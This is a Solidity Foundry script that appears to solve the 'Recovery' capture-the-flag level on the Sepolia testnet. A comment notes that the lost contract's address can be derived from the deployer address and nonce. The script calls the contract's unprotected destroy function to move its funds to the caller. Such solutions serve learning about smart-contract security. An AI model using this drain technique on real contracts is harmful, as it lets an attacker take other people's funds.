// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {SimpleToken} from "../src/Recovery.sol";

contract SolveRecovery is Script {
    SimpleToken public token;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        //i did get the address from the deployment sepolia explorer
        // you can calculate it too by using the formula:
        // address = keccak256(rlp.encode([sender, nonce]))
        // where sender is the deployer address and nonce is the
        // number of transactions sent from that address before this deployment
        token = SimpleToken(payable(0xE7C53a700847A859E3cd26c3afbEC450d6cF85b6));
        token.destroy(payable(msg.sender));
        vm.stopBroadcast();
    }
}
